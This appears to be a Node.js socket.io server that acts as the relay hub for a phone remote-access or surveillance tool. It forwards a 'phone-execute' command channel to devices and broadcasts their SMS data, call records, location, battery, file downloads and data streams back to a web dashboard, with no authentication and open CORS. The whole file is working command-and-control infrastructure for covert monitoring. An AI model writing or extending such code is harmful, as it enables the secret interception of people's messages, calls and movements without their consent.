const express = require('express');
const http = require('http');
const path = require('path'); 
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

// Handle large image transfers (100MB buffer)
const io = new Server(server, {
    maxHttpBufferSize: 1e8,
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;

// DIRECTORY FIX: Tell Express where your public folder is
const publicPath = path.join(__dirname, 'public');

// Serve all static files from /public
app.use(express.static(publicPath));

// ROUTE FIX: Serve index.html from inside /public
app.get('/', (req, res) => {
    const indexPath = path.join(publicPath, 'index.html');
    res.sendFile(indexPath, (err) => {
        if (err) {
            console.error("ERROR: Cannot find index.html at " + indexPath);
            res.status(404).send("Error: index.html not found in public folder");
        }
    });
});

// Socket.io Broadcaster
io.on('connection', (socket) => {
    console.log('Connected:', socket.id);

    socket.on('phone-execute', (cmd) => io.emit('phone-execute', cmd));
    socket.on('battery-update', (data) => io.emit('battery-update', data));
    socket.on('location-update', (data) => io.emit('location-update', data));
    socket.on('sms-data', (data) => io.emit('sms-data', data));
    socket.on('call-data', (data) => io.emit('call-data', data));
    socket.on('data-stream', (data) => io.emit('data-stream', data));
    socket.on('file-download-ready', (data) => {
    io.emit('file-download-ready', data);
});

    socket.on('disconnect', () => console.log('User disconnected'));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Looking for index.html in: ${path.join(__dirname, 'public')}`);
});

